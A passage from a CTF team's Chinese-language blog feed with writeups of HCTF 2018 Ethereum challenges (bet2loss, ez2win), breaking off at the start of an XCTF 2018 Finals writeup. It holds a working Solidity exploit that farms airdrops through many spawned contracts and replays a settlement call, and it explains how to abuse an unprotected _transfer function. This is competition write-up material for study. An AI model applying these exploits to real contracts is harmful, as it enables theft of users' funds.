class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>空投，自然想到薅羊毛。</p><p>这个代码很容易看出是从dice2win改过来的，有的参数都没有删干净。 可以参考<a href="http://blogs.360.cn/post/Fairness_Analysis_of_Dice2win.html" target="_blank" rel="noopener"></a>里面的一些介绍。 dice2win主要的流程如下 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.【庄家承诺】庄家(secretSigner)随机生成某随机数reveal，同时计算commit = keccak256 (reveal)对该reveal进行承诺。然后根据目前区块高度，设置一个该承诺使用的最后区块高度commitLastBlock。 对commitLastBlock和commit的组合体进行签名得到sig，同时把(commit, commitLastBlock,sig)发送给玩家。</span><br><span class="line">2. 【玩家下注】玩家获得(commit, commitLastBlock,sig)后选择具体要玩的游戏，猜测一个随机数r，发送下注交易placeBet到智能合约上进行下注。</span><br><span class="line">3. 【矿工打包】下注交易被以太坊矿工打包到区块block1中，并将玩家下注内容存储到合约存储空间中。</span><br><span class="line">4.【庄家开奖】当庄家在区块block1中看到玩家的下注信息后。则发送settleBet交易公开承诺值reveal到区块链上。合约计算随机数random_number=keccak256(reveal,block1.hash)。如果random_number满足用户下注条件，则用户胜，否则庄家胜。此外游戏还设有大奖机制，即如果某次random_number满足某个特殊值(如88888)，则用户可赢得奖金池中的大奖。</span><br></pre></td></tr></table></figure></p><p>可以简单地说，调用placeBet下注，调用settleBet开奖。</p><p>可以看一下我们可以调用哪些函数，直接把源码复制到remix中，部署一下 在右下角，我们可以看到可以调用的函数。 PayForFlag函数用来证明自己完成任务，让后台发flag的证明 placeBet函数下注 settleBet函数结算 setSecretSigner函数设置签名者，只有owner可以调用。（如果commit-reveal机制） transfer 函数，直接可以从msg.sender账户中向特定地址转账。</p><p>简单可以想到，可以创建一个合约，调用这个合约的函数，创建多个临时合约（这里临时指的是，我们临时用一用，用完就不理它了），然后这些临时合约将钱转给某个特定的地址，那么就可以积少成多，达到题目的要求。</p><p>回头看看空投在哪里触发，<code>AirdropCheck()</code>检查该用户是否新用户，如果是，则空投1000 B2GB。 在placeBet函数和settleBet函数中都有调用。 直接上EXP <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"><span class="comment">// Wow. Welcome to hctf2018</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"browser/bet2loss.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract KongTouBot&#123;</span><br><span class="line">    constructor(address victim, address attack) <span class="keyword">public</span> payable&#123;</span><br><span class="line">       Bet2Loss victimContract = Bet2Loss(victim);</span><br><span class="line">       victimContract.settleBet(<span class="number">47080097</span>);</span><br><span class="line">       victimContract.transfer(attack, <span class="number">900</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">function <span class="title">kill</span><span class="params">()</span> <span class="keyword">public</span></span>&#123;</span><br><span class="line">        selfdestruct(<span class="number">0xdea21565e077aa6b5864446e1624f553dc158603</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Bet2LossEXP&#123;</span><br><span class="line">    constructor() <span class="keyword">public</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(var i=<span class="number">0</span>; i &lt; <span class="number">50</span>; i++)&#123;</span><br><span class="line">            KongTouBot tmp = <span class="keyword">new</span> KongTouBot(<span class="number">0x006b9bc418e43e92cf8d380c56b8d4be41fda319</span>,msg.sender);</span><br><span class="line">            <span class="comment">//tmp.kill();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//selfdestruct(msg.sender);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">attack</span><span class="params">(uint num)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(var i=<span class="number">0</span>; i &lt; num; i++)&#123;</span><br><span class="line">            KongTouBot tmp = <span class="keyword">new</span> KongTouBot(<span class="number">0x006b9bc418e43e92cf8d380c56b8d4be41fda319</span>,msg.sender);</span><br><span class="line">            <span class="comment">//tmp.kill();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>victimContract.settleBet(47080097);</code>这里需要稍微理解commit-reveal机制，从庄家开奖的交易中找参数，因为这里没有限制只能开奖一次（不过注意，转账是从调用开奖这个函数的人那里转给下注的人）。</p><p>然后，疯狂跑就是了，建议用geth接入测试网络，然后web3.js来直接批量操作，不然，如果使用metamask，你会很绝望，要一个一个交易确认。</p><h2><span id="ez2win">ez2win</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @title ERC20 interface</span></span><br><span class="line"><span class="comment"> * @dev see https://github.com/ethereum/EIPs/issues/20</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">  <span class="function">function <span class="title">totalSupply</span><span class="params">()</span> external view <span class="title">returns</span> <span class="params">(uint256)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">balanceOf</span><span class="params">(address who)</span> external view <span class="title">returns</span> <span class="params">(uint256)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">allowance</span><span class="params">(address owner, address spender)</span></span></span><br><span class="line"><span class="function">    external view <span class="title">returns</span> <span class="params">(uint256)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">transfer</span><span class="params">(address to, uint256 value)</span> external <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">approve</span><span class="params">(address spender, uint256 value)</span></span></span><br><span class="line"><span class="function">    external <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">transferFrom</span><span class="params">(address from, address to, uint256 value)</span></span></span><br><span class="line"><span class="function">    external <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">event <span class="title">Transfer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    address indexed from,</span></span></span><br><span class="line"><span class="function"><span class="params">    address indexed to,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint256 value</span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">event <span class="title">Approval</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    address indexed owner,</span></span></span><br><span class="line"><span class="function"><span class="params">    address indexed spender,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint256 value</span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">event <span class="title">GetFlag</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="built_in">string</span> b64email,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="built_in">string</span> back</span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @title SafeMath</span></span><br><span class="line"><span class="comment"> * @dev Math operations with safety checks that revert on error</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">library SafeMath &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Multiplies two numbers, reverts on overflow.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function">function <span class="title">mul</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Gas optimization: this is cheaper than requiring 'a' not being zero, but the</span></span><br><span class="line">    <span class="comment">// benefit is lost if 'b' is also tested.</span></span><br><span class="line">    <span class="comment">// See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522</span></span><br><span class="line">    <span class="keyword">if</span> (a == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 c = a * b;</span><br><span class="line">    require(c / a == b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function">function <span class="title">div</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    require(b &gt; <span class="number">0</span>); <span class="comment">// Solidity only automatically asserts when dividing by 0</span></span><br><span class="line">    uint256 c = a / b;</span><br><span class="line">    <span class="comment">// assert(a == b * c + a % b); // There is no case in which this doesn't hold</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function">function <span class="title">sub</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    require(b &lt;= a);</span><br><span class="line">    uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Adds two numbers, reverts on overflow.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function">function <span class="title">add</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    require(c &gt;= a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @title Standard ERC20 token</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @dev Implementation of the basic standard token.</span></span><br><span class="line"><span class="comment"> * https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md</span></span><br><span class="line"><span class="comment"> * Originally based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract ERC20 is IERC20 &#123;</span><br><span class="line">  <span class="keyword">using</span> SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line"></span><br><span class="line">  mapping (address =&gt; uint256) <span class="keyword">public</span> _balances;</span><br><span class="line"></span><br><span class="line">  mapping (address =&gt; mapping (address =&gt; uint256)) <span class="keyword">public</span> _allowed;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; <span class="keyword">bool</span>) initialized;</span><br><span class="line"></span><br><span class="line">  uint256 <span class="keyword">public</span> _totalSupply;</span><br><span class="line">  </span><br><span class="line">  uint256 <span class="keyword">public</span> constant _airdropAmount = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Total number of tokens in existence</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function">function <span class="title">totalSupply</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> _totalSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Gets the balance of the specified address.</span></span><br><span class="line"><span class="comment">  * @param owner The address to query the balance of.</span></span><br><span class="line"><span class="comment">  * @return An uint256 representing the amount owned by the passed address.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function">function <span class="title">balanceOf</span><span class="params">(address owner)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> _balances[owner];</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// airdrop</span></span><br><span class="line">  <span class="function">function <span class="title">AirdropCheck</span><span class="params">()</span> internal <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span> success)</span></span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (!initialized[msg.sender]) &#123;</span><br><span class="line">            initialized[msg.sender] = <span class="literal">true</span>;</span><br><span class="line">            _balances[msg.sender] = _airdropAmount;</span><br><span class="line">            _totalSupply += _airdropAmount;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * @dev Function to check the amount of tokens that an owner allowed to a spender.</span></span><br><span class="line"><span class="comment">   * @param owner address The address which owns the funds.</span></span><br><span class="line"><span class="comment">   * @param spender address The address which will spend the funds.</span></span><br><span class="line"><span class="comment">   * @return A uint256 specifying the amount of tokens still available for the spender.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function">function <span class="title">allowance</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    address owner,</span></span></span><br><span class="line"><span class="function"><span class="params">    address spender</span></span></span><br><span class="line"><span class="function"><span class="params">   )</span></span></span><br><span class="line"><span class="function">    <span class="keyword">public</span></span></span><br><span class="line"><span class="function">    view</span></span><br><span class="line"><span class="function">    <span class="title">returns</span> <span class="params">(uint256)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> _allowed[owner][spender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Transfer token for a specified address</span></span><br><span class="line"><span class="comment">  * @param to The address to transfer to.</span></span><br><span class="line"><span class="comment">  * @param value The amount to be transferred.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function">function <span class="title">transfer</span><span class="params">(address to, uint256 value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span>)</span> </span>&#123;</span><br><span class="line">    AirdropCheck();</span><br><span class="line">    _transfer(msg.sender, to, value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.</span></span><br><span class="line"><span class="comment">   * Beware that changing an allowance with this method brings the risk that someone may use both the old</span></span><br><span class="line"><span class="comment">   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this</span></span><br><span class="line"><span class="comment">   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:</span></span><br><span class="line"><span class="comment">   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729</span></span><br><span class="line"><span class="comment">   * @param spender The address which will spend the funds.</span></span><br><span class="line"><span class="comment">   * @param value The amount of tokens to be spent.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function">function <span class="title">approve</span><span class="params">(address spender, uint256 value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span>)</span> </span>&#123;</span><br><span class="line">    require(spender != address(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    AirdropCheck();</span><br><span class="line">    _allowed[msg.sender][spender] = value;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * @dev Transfer tokens from one address to another</span></span><br><span class="line"><span class="comment">   * @param from address The address which you want to send tokens from</span></span><br><span class="line"><span class="comment">   * @param to address The address which you want to transfer to</span></span><br><span class="line"><span class="comment">   * @param value uint256 the amount of tokens to be transferred</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function">function <span class="title">transferFrom</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    address from,</span></span></span><br><span class="line"><span class="function"><span class="params">    address to,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint256 value</span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span></span><br><span class="line"><span class="function">    <span class="keyword">public</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span>)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    require(value &lt;= _allowed[from][msg.sender]);</span><br><span class="line">    AirdropCheck();</span><br><span class="line"></span><br><span class="line">    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);</span><br><span class="line">    _transfer(from, to, value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Transfer token for a specified addresses</span></span><br><span class="line"><span class="comment">  * @param from The address to transfer from.</span></span><br><span class="line"><span class="comment">  * @param to The address to transfer to.</span></span><br><span class="line"><span class="comment">  * @param value The amount to be transferred.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  function _transfer(address from, address to, uint256 value) &#123;</span><br><span class="line">    require(value &lt;= _balances[from]);</span><br><span class="line">    require(to != address(<span class="number">0</span>));</span><br><span class="line">    require(value &lt;= <span class="number">10000000</span>);</span><br><span class="line"></span><br><span class="line">    _balances[from] = _balances[from].sub(value);</span><br><span class="line">    _balances[to] = _balances[to].add(value);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract D2GBToken is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">string</span> <span class="keyword">public</span> constant name = <span class="string">"D2GB"</span>;</span><br><span class="line">  <span class="built_in">string</span> <span class="keyword">public</span> constant symbol = <span class="string">"D2GB"</span>;</span><br><span class="line">  uint8 <span class="keyword">public</span> constant decimals = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">  uint256 <span class="keyword">public</span> constant INITIAL_SUPPLY = <span class="number">20000000000</span> * (<span class="number">10</span> ** uint256(decimals));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Constructor that gives msg.sender all of existing tokens.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  constructor() <span class="keyword">public</span> &#123;</span><br><span class="line">    _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">    _balances[msg.sender] = INITIAL_SUPPLY;</span><br><span class="line">    initialized[msg.sender] = <span class="literal">true</span>;</span><br><span class="line">    emit Transfer(address(0), msg.sender, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//flag</span></span><br><span class="line">  <span class="function">function <span class="title">PayForFlag</span><span class="params">(<span class="built_in">string</span> b64email)</span> <span class="keyword">public</span> payable <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span> success)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    require (_balances[msg.sender] &gt; <span class="number">10000000</span>);</span><br><span class="line">      <span class="function">emit <span class="title">GetFlag</span><span class="params">(b64email, <span class="string">"Get flag!"</span>)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给了源码。 拿去部署下，很容易发现_transfer函数可以直接访问，即可以指定任意地址向某地址转账。 直接在交易中找创始人，调用该函数向自己的地址转题目要求i的金额就是。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;de1ta-team&quot;&gt;&lt;strong&gt;De1ta-Team&lt;/strong&gt;&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://blog.de1ta.com/tags/ctf/"/>
    
      <category term="re" scheme="https://blog.de1ta.com/tags/re/"/>
    
      <category term="web" scheme="https://blog.de1ta.com/tags/web/"/>
    
      <category term="crypto" scheme="https://blog.de1ta.com/tags/crypto/"/>
    
      <category term="pwn" scheme="https://blog.de1ta.com/tags/pwn/"/>
    
      <category term="misc" scheme="https://blog.de1ta.com/tags/misc/"/>
    
      <category term="writeup" scheme="https://blog.de1ta.com/tags/writeup/"/>
    
      <category term="hctf" scheme="https://blog.de1ta.com/tags/hctf/"/>
    
  </entry>
  
  <entry>
    <title>XCTF 2018 FINALS Writeup</title>
    <link href="https://blog.de1ta.com/2018/11/04/XCTF%202018%20FINALS/"/>
    <id>https://blog.de1ta.com/2018/11/04/XCTF 2018 FINALS/</id>
    <published>2018-11-04T06:53:00.000Z</published>
    <updated>2020-05-07T04:29:33.779Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="de1ta-team"><strong>De1ta-Team</strong></span></h1><a id="more"></a><blockquote><p>Team：De1ta</p></blockquote><!-- toc --><ul><li><a href="#web">Web</a><ul><li><a href="#best-php">best php</a></li><li><a href="#pubg">PUBG</a></li></ul></li><li><a href="#pwn">Pwn</a><ul><li><a href="#nobof">nobof</a></li><li><a href="#reader">reader</a></li></ul></li><li><a href="#misc">Misc</a><ul><li><a href="#mysterious-signals">Mysterious signals</a></li><li><a href="#核弹遥控器密码">核弹遥控器密码</a></li><li><a href="#诡异的校验">诡异的校验</a></li></ul></li><li><a href="#awd">AWD</a><ul><li><a href="#pubg">pubg</a></li><li><a href="#randbattle">randbattle</a></li></ul></li></ul><!-- tocstop --><p>题目打包链接：https://raw.githubusercontent.com/De1ta-team/CTF_Challenges/master/XCTF2018_Final_Challenges.zip</p><p>今年我们De1ta在前面一半XCTF联赛分站赛都没有参加的情况下，以后几场分站赛总积分排名第19勉强挤进XCTF总决赛（感谢r3kapig的大佬们抬了一手），最终我们解题排名第六，攻防排名第九，总分排名第九，给队内所有师傅递茶！tql</p><p>顺便打个小广告：De1ta长期招Web/逆向/pwn/密码学/硬件/取证/杂项/etc.选手，急招二进制和密码选手,有意向的大佬请联系ZGUxdGFAcHJvdG9ubWFpbC5jb20=</p><p>[TOC]</p><h1><span id="web">Web</span></h1><h2><span id="best-php">best php</span></h2><p>just try it! <a href="http://10.99.99.16" target="_blank" rel="noopener">http://10.99.99.16</a> <img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/babyphp_00.png"></p><p>index.php <figure class="highlight php5"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 